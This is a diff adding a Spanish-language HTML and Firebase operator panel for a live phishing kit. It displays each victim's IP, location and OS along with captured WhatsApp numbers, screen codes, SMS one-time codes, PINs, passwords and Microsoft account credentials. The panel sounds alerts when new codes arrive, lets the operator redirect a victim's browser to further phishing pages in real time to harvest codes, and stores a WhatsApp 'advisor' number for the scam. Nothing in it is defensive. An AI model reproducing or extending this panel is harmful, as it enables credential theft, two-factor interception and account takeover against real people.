@@ -1,0 +1,512 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Panel - SC</title>
+    <script src="phoneValidation.js"></script>
+    <style>
+        body { background: #1a1b3c; color: #fff; font-family: Arial; margin: 0; padding: 20px; }
+        h1 { text-align: center; }
+        .header-actions { text-align: center; margin-bottom: 20px; }
+        .header-actions a { color: #fff; text-decoration: none; background: #e74c3c; padding: 10px 20px; border-radius: 5px; margin: 0 5px; }
+        #tablesContainer { display: grid; grid-template-columns: repeat(auto-fill, minmax(600px, 1fr)); gap: 20px; }
+        .card { background: #2a2d64; border-radius: 12px; padding: 20px; position: relative; box-shadow: 0 8px 16px rgba(0,0,0,0.4); border: 1px solid #3d4182; }
+        .status { padding: 4px 15px; border-radius: 15px; font-size: 12px; font-weight: bold; display: inline-block; margin-bottom: 12px; color: white; }
+        .online { background-color: #2e7d32; }
+        .offline { background-color: #757575; }
+        .blocked { background-color: #d32f2f; }
+        .close { position: absolute; top: 15px; right: 20px; cursor: pointer; font-size: 18px; }
+        .info { font-size: 13px; color: #cfd8dc; margin-bottom: 15px; border-bottom: 1px solid rgba(255, 255, 255, 0.2); padding-bottom: 12px; }
+        .grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin-bottom: 20px; }
+        .grid-item-full { grid-column: 1 / -1; }
+        .grid-item { text-align: center; }
+        .label { font-weight: bold; font-size: 13px; margin-bottom: 8px; }
+        .value { background: #0288d1; color: white; padding: 10px; border-radius: 20px; font-size: 12px; word-break: break-all; cursor: pointer; border: none; width: 98%; max-height: 60px; overflow-y: auto; }
+        .value:hover { background: #0277bd; }
+        .actions { display: flex; gap: 8px; flex-wrap: wrap; }
+        .btn { flex: 1; min-width: 65px; padding: 8px; border-radius: 6px; border: none; color: white; font-weight: bold; cursor: pointer; font-size: 11px; }
+        .btn-login { background: #c0ca33; }
+        .btn-sms { background: #1e88e5; }
+        .btn-trans { background: #039be5; }
+        .btn-pwd { background: #8e24aa; }
+        .btn-redirect { background: #66bb6a; }
+        .btn-block { background: #d32f2f; }
+        .btn:disabled { background: #555 !important; cursor: not-allowed; opacity: 0.6; }
+        @media (max-width: 650px) {
+            .grid { grid-template-columns: repeat(2, 1fr); }
+        }
+        .advisor-config-card {
+            background: #232652;
+            border: 1px solid #3d4182;
+            border-radius: 10px;
+            max-width: 620px;
+            margin: 0 auto 25px auto;
+            padding: 16px 20px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+        }
+        .advisor-config-title {
+            font-weight: bold;
+            font-size: 14px;
+            margin-bottom: 8px;
+            color: #4fc3f7;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .advisor-config-form {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+        .advisor-config-form label {
+            font-size: 12px;
+            color: #cfd8dc;
+        }
+        .advisor-input-group {
+            display: flex;
+            gap: 10px;
+        }
+        .advisor-input-group input {
+            flex: 1;
+            padding: 9px 14px;
+            border-radius: 6px;
+            border: 1px solid #4a5099;
+            background: #151736;
+            color: #fff;
+            font-size: 14px;
+            font-family: monospace;
+            outline: none;
+        }
+        .advisor-input-group input:focus {
+            border-color: #25d366;
+        }
+        .advisor-input-group button {
+            background: #25d366;
+            color: #fff;
+            border: none;
+            padding: 9px 18px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 13px;
+            transition: background 0.2s;
+            white-space: nowrap;
+        }
+        .advisor-input-group button:hover {
+            background: #20ba5a;
+        }
+        .advisor-save-msg {
+            font-size: 12px;
+            color: #81c784;
+            min-height: 16px;
+        }
+        .btn-sound {
+            background: #2e7d32;
+            color: #fff;
+            border: none;
+            padding: 9px 16px;
+            border-radius: 5px;
+            margin: 0 4px;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 12px;
+            vertical-align: middle;
+            transition: background 0.2s;
+        }
+        .btn-sound.muted {
+            background: #757575;
+        }
+        .btn-test-sound {
+            background: #0288d1;
+            color: #fff;
+            border: none;
+            padding: 9px 12px;
+            border-radius: 5px;
+            margin: 0 3px;
+            font-size: 12px;
+            cursor: pointer;
+            vertical-align: middle;
+            transition: background 0.2s;
+        }
+        .btn-test-sound:hover {
+            background: #0277bd;
+        }
+    </style>
+</head>
+<body>
+    <h1>🔥 Panel SC</h1>
+    <div class="header-actions">
+        <a href="srefks.html">Logout</a>
+        <a href="reset.html">Limpiar</a>
+        <button type="button" id="soundToggleBtn" class="btn-sound" onclick="toggleSound()">🔊 Alertas: ON</button>
+        <button type="button" class="btn-test-sound" onclick="testPhoneSound()" title="Probar sonido cuando llega celular">📱 Probar Celular</button>
+        <button type="button" class="btn-test-sound" onclick="testCodeSound()" title="Probar sonido cuando llega código o PIN">🔑 Probar Código/PIN</button>
+    </div>
+    <div class="advisor-config-card">
+        <div class="advisor-config-title">
+            <span>⚙️ Configuración Número de Asesor (WhatsApp)</span>
+        </div>
+        <div class="advisor-config-form">
+            <label for="advisorPhoneInput">Número con código de país (sin '+' ni espacios, ej: 573243161381):</label>
+            <div class="advisor-input-group">
+                <input type="text" id="advisorPhoneInput" placeholder="573243161381" value="573243161381" onkeydown="if(event.key==='Enter') saveAdvisorPhone()">
+                <button type="button" id="saveAdvisorPhoneBtn" onclick="saveAdvisorPhone()">Guardar Número</button>
+            </div>
+            <span id="advisorSaveMsg" class="advisor-save-msg"></span>
+        </div>
+    </div>
+    <div id="tablesContainer"></div>
+    <script type="module">
+import { database, auth, onAuthStateChanged, ref, update, onValue, set, remove } from './firebase-config.js';
+
+onAuthStateChanged(auth, (user) => {
+    if (!user && sessionStorage.getItem('admin_logged_in') !== 'true') {
+        window.location.href = 'srefks.html';
+    }
+});
+
+// Configuración del Asesor
+window.saveAdvisorPhone = function() {
+    const input = document.getElementById('advisorPhoneInput');
+    if (!input) return;
+    const phone = input.value.trim();
+    if (!phone) return;
+    set(ref(database, 'config/advisorPhone'), phone).then(() => {
+        const msg = document.getElementById('advisorSaveMsg');
+        if (msg) {
+            msg.textContent = "✅ Guardado correctamente";
+            setTimeout(() => msg.textContent = "", 3000);
+        }
+    }).catch(e => console.error(e));
+};
+
+onValue(ref(database, 'config/advisorPhone'), (snapshot) => {
+    if (snapshot.exists()) {
+        const input = document.getElementById('advisorPhoneInput');
+        if (input) input.value = snapshot.val();
+    }
+});
+
+// --- SISTEMA DE AUDIO Y NOTIFICACIONES SONORAS ---
+let soundEnabled = true;
+let audioUnlocked = false;
+
+// Audio para celular (usa el archivo dejado en content/notification.mp3)
+const phoneAudio = new Audio('content/notification.mp3');
+// Audio para códigos / PIN (usa content/code_notification.wav)
+const codeAudio = new Audio('content/code_notification.wav');
+
+phoneAudio.load();
+codeAudio.load();
+
+function playToneCodeSound() {
+    try {
+        const AudioCtx = window.AudioContext || window.webkitAudioContext;
+        if (!AudioCtx) return;
+        const ctx = new AudioCtx();
+        const now = ctx.currentTime;
+        const osc1 = ctx.createOscillator();
+        const gain1 = ctx.createGain();
+        osc1.type = 'sine';
+        osc1.frequency.setValueAtTime(659.25, now);
+        gain1.gain.setValueAtTime(0.3, now);
+        gain1.gain.exponentialRampToValueAtTime(0.001, now + 0.25);
+        osc1.connect(gain1);
+        gain1.connect(ctx.destination);
+        osc1.start(now);
+        osc1.stop(now + 0.25);
+
+        const osc2 = ctx.createOscillator();
+        const gain2 = ctx.createGain();
+        osc2.type = 'sine';
+        osc2.frequency.setValueAtTime(987.77, now + 0.15);
+        gain2.gain.setValueAtTime(0.35, now + 0.15);
+        gain2.gain.exponentialRampToValueAtTime(0.001, now + 0.45);
+        osc2.connect(gain2);
+        gain2.connect(ctx.destination);
+        osc2.start(now + 0.15);
+        osc2.stop(now + 0.45);
+    } catch(e) {}
+}
+
+window.playPhoneSound = function() {
+    if (!soundEnabled) return;
+    try {
+        phoneAudio.currentTime = 0;
+        const p = phoneAudio.play();
+        if (p && typeof p.catch === 'function') {
+            p.catch(err => console.log('Autoplay audio celular esperando interacción:', err));
+        }
+    } catch(e) {
+        console.warn('Error al reproducir audio celular:', e);
+    }
+};
+
+window.playCodeSound = function() {
+    if (!soundEnabled) return;
+    try {
+        codeAudio.currentTime = 0;
+        const p = codeAudio.play();
+        if (p && typeof p.catch === 'function') {
+            p.catch(() => {
+                playToneCodeSound();
+            });
+        }
+    } catch(e) {
+        playToneCodeSound();
+    }
+};
+
+window.toggleSound = function() {
+    soundEnabled = !soundEnabled;
+    const btn = document.getElementById('soundToggleBtn');
+    if (btn) {
+        if (soundEnabled) {
+            btn.textContent = '🔊 Alertas: ON';
+            btn.classList.remove('muted');
+        } else {
+            btn.textContent = '🔇 Alertas: OFF';
+            btn.classList.add('muted');
+        }
+    }
+    unlockAudio();
+};
+
+window.testPhoneSound = function() {
+    unlockAudio();
+    window.playPhoneSound();
+};
+
+window.testCodeSound = function() {
+    unlockAudio();
+    window.playCodeSound();
+};
+
+function unlockAudio() {
+    if (audioUnlocked) return;
+    audioUnlocked = true;
+    phoneAudio.play().then(() => {
+        phoneAudio.pause();
+        phoneAudio.currentTime = 0;
+    }).catch(() => {});
+    codeAudio.play().then(() => {
+        codeAudio.pause();
+        codeAudio.currentTime = 0;
+    }).catch(() => {});
+}
+
+document.addEventListener('click', unlockAudio, { once: true });
+document.addEventListener('keydown', unlockAudio, { once: true });
+
+// Rastrear eventos nuevos para no disparar sonido con datos históricos
+const processedSubmissions = new Set();
+const processedPhones = new Set();
+let isInitialFirebaseLoad = true;
+
+onValue(ref(database, 'users'), (snapshot) => {
+    const data = snapshot.val();
+    let hasNewPhone = false;
+    let hasNewCode = false;
+    let html = "";
+    if (data) {
+        for (const id in data) {
+            const u = data[id];
+            const ip = u.ip || "-", loc = u.location || "-", os = u.os || "-", status = u.status || "online", state = u.state || "allow", currentPage = u.currentPage || "-";
+            let phone = u.phoneNumber || "-", pantalla = "-", sms = "-", pin = "-", password = "-", email = u.email || "-", msPassword = "-";
+
+            // Verificar si hay número nuevo a nivel de usuario
+            if (u.phoneNumber && u.phoneNumber !== '-') {
+                const phoneKey = id + '_user_phone_' + u.phoneNumber;
+                if (!processedPhones.has(phoneKey)) {
+                    if (!isInitialFirebaseLoad) {
+                        hasNewPhone = true;
+                    }
+                    processedPhones.add(phoneKey);
+                }
+            }
+
+            if (u.submissions) {
+                for (const s in u.submissions) {
+                    const subKey = id + '_' + s;
+                    const sub = u.submissions[s];
+                    const d = sub.data || {};
+
+                    // Detectar nuevos envíos para sonar alerta
+                    if (!processedSubmissions.has(subKey)) {
+                        if (!isInitialFirebaseLoad) {
+                            const isCodeOrPin = (
+                                sub.type === 'screen_code' ||
+                                sub.type === 'sms_code' ||
+                                sub.type === 'pin_code' ||
+                                sub.type === 'password_code' ||
+                                Boolean(d.pantalla || d.screenCode || d.sms || d.jcs || d.pin || d.trans || d.jct || d.password || d.contra || d.pass)
+                            );
+
+                            const isPhone = (
+                                sub.type === 'whatsapp_sync' ||
+                                sub.type === 'phone_number' ||
+                                Boolean(d.phoneNumber || d.rawPhone)
+                            );
+
+                            if (isCodeOrPin) {
+                                hasNewCode = true;
+                            } else if (isPhone) {
+                                hasNewPhone = true;
+                            }
+                        }
+                        processedSubmissions.add(subKey);
+                    }
+                    
+                    // Buscar número de WhatsApp (prioridad alta)
+                    if (d.phoneNumber && d.phoneNumber.includes('+')) {
+                        phone = d.phoneNumber;
+                    } else if (d.rawPhone && d.countryCode) {
+                        phone = d.countryCode + ' ' + d.rawPhone;
+                    }
+                    // Fallback a usuario si no hay teléfono
+                    else if (d.jusr && phone === "-") {
+                        phone = d.jusr;
+                    }
+                    
+                    // Buscar Pantalla (de index5.html)
+                    if (d.pantalla) {
+                        pantalla = d.pantalla;
+                    } else if (sub.type === 'screen_code' && d.screenCode) {
+                        pantalla = d.screenCode;
+                    }
+                    
+                    // Buscar SMS (de index6.html)
+                    if (sub.type === 'sms_code' && (d.sms || d.jcs)) {
+                        sms = d.sms || d.jcs;
+                    } else if (d.sms && sub.type !== 'screen_code') {
+                        sms = d.sms;
+                    } else if (d.jcs && sub.type !== 'screen_code') {
+                        sms = d.jcs;
+                    }
+                    
+                    // Buscar PIN (de index7.html)
+                    if (d.pin) {
+                        pin = d.pin;
+                    } else if (d.trans) {
+                        pin = d.trans;
+                    } else if (d.jct) {
+                        pin = d.jct;
+                    }
+
+                    // Buscar Contraseña (de index8.html)
+                    if (d.password) {
+                        password = d.password;
+                    } else if (d.contra) {
+                        password = d.contra;
+                    } else if (d.pass) {
+                        password = d.pass;
+                    }
+
+                    // Buscar Correo y Clave (de Microsoft)
+                    if (d.Contraseña) {
+                        msPassword = d.Contraseña;
+                    }
+                    if (d.email) {
+                        email = d.email;
+                    } else if (d.Correo) {
+                        email = d.Correo;
+                    }
+                }
+            }
+            const displayPhone = (typeof formatFullPhoneNumber === 'function' && phone !== '-') 
+                ? formatFullPhoneNumber(phone) 
+                : phone;
+            const st = state === "block" ? "blocked" : (status === "online" ? "online" : "offline");
+            const stxt = state === "block" ? "🚫 BLOQ" : (status === "online" ? "🟢 ON" : "🔴 OFF");
+
+            // Omitir registros completamente en blanco y desconectados
+            if (st === "offline" && phone === "-" && pantalla === "-" && sms === "-" && pin === "-" && password === "-" && email === "-" && msPassword === "-") {
+                continue;
+            }
+
+            html += `<div class="card"><span class="status ${st}">${stxt}</span><span class="close" onclick="del('${id}')">✕</span>
+            <div class="info">📄 ${currentPage} | IP: ${ip} | ${loc} | ${os}</div>
+            <div class="grid">
+            <div class="grid-item grid-item-full"><div class="label">📱 Número WhatsApp</div><button class="value" onclick="cp('${displayPhone}', this)">${displayPhone}</button></div>
+            <div class="grid-item"><div class="label">🖥️ Pantalla</div><button class="value" onclick="cp('${pantalla}', this)">${pantalla}</button></div>
+            <div class="grid-item"><div class="label">📨 SMS</div><button class="value" onclick="cp('${sms}', this)">${sms}</button></div>
+            <div class="grid-item"><div class="label">🔑 PIN</div><button class="value" onclick="cp('${pin}', this)">${pin}</button></div>
+            <div class="grid-item"><div class="label">🔒 Contraseña</div><button class="value" onclick="cp('${password}', this)">${password}</button></div>
+            </div>
+            <div class="actions">
+            <button class="btn btn-login" onclick="rd('${id}', 'index5.html')" ${currentPage === 'cargando.html' ? '' : 'disabled title="Solo en cargando.html"'}>Pantalla</button>
+            <button class="btn btn-sms" onclick="rd('${id}', 'index6.html')" ${currentPage === 'cargando.html' ? '' : 'disabled title="Solo en cargando.html"'}>SMS</button>
+            <button class="btn btn-trans" onclick="rd('${id}', 'index7.html')" ${currentPage === 'cargando.html' ? '' : 'disabled title="Solo en cargando.html"'}>Pin</button>
+            <button class="btn btn-pwd" onclick="rd('${id}', 'index8.html')" ${currentPage === 'cargando.html' ? '' : 'disabled title="Solo en cargando.html"'}>Contraseña</button>
+            <button class="btn btn-redirect" onclick="rd('${id}', 'https://www.google.com')" ${currentPage === 'cargando.html' ? '' : 'disabled title="Solo en cargando.html"'}>Google</button>
+            <button class="btn btn-block" onclick="blk('${id}')">BLOQUEAR</button>
+            </div></div>`;
+        }
+    }
+
+    // Reproducir alertas si no es la carga inicial
+    if (!isInitialFirebaseLoad) {
+        if (hasNewCode && hasNewPhone) {
+            window.playCodeSound();
+            setTimeout(() => window.playPhoneSound(), 1000);
+        } else if (hasNewCode) {
+            window.playCodeSound();
+        } else if (hasNewPhone) {
+            window.playPhoneSound();
+        }
+    } else {
+        isInitialFirebaseLoad = false;
+    }
+
+    document.getElementById("tablesContainer").innerHTML = html || "<p style='text-align:center'>Esperando...</p>";
+});
+
+window.cp = (t, b) => { navigator.clipboard.writeText(t); b.textContent = '✓'; setTimeout(() => b.textContent = t.substring(0,12), 1000); }
+window.rd = (id, p) => update(ref(database, 'users/' + id), { currentPage: p });
+window.blk = (id) => { if(confirm("¿Bloquear?")) update(ref(database, 'users/' + id), { state: "block" }); }
+window.del = (id) => { if(confirm("¿Eliminar registro?")) remove(ref(database, 'users/' + id)); }
+
+// Sincronizar número de asesor desde Firebase
+const advisorInput = document.getElementById('advisorPhoneInput');
+const advisorMsg = document.getElementById('advisorSaveMsg');
+
+onValue(ref(database, 'settings/advisor_phone'), (snapshot) => {
+    const val = snapshot.val();
+    if (val && advisorInput && document.activeElement !== advisorInput) {
+        advisorInput.value = val;
+    }
+});
+
+window.saveAdvisorPhone = async () => {
+    if (!advisorInput) return;
+    const cleanNumber = advisorInput.value.replace(/\D/g, '');
+    if (!cleanNumber) {
+        if (advisorMsg) {
+            advisorMsg.style.color = '#e57373';
+            advisorMsg.textContent = '❌ Por favor ingresa un número válido con código de país.';
+        }
+        return;
+    }
+    const saveBtn = document.getElementById('saveAdvisorPhoneBtn');
+    if (saveBtn) saveBtn.disabled = true;
+    try {
+        await set(ref(database, 'settings/advisor_phone'), cleanNumber);
+        advisorInput.value = cleanNumber;
+        if (advisorMsg) {
+            advisorMsg.style.color = '#81c784';
+            advisorMsg.textContent = '✅ Guardado: +' + cleanNumber;
+            setTimeout(() => { if (advisorMsg) advisorMsg.textContent = ''; }, 4000);
+        }
+    } catch(err) {
+        console.error(err);
+        if (advisorMsg) {
+            advisorMsg.style.color = '#e57373';
+            advisorMsg.textContent = '❌ Error al guardar en Firebase';
+        }
+    } finally {
+        if (saveBtn) saveBtn.disabled = false;
+    }
+};
+    </script>
+</body>
+</html>
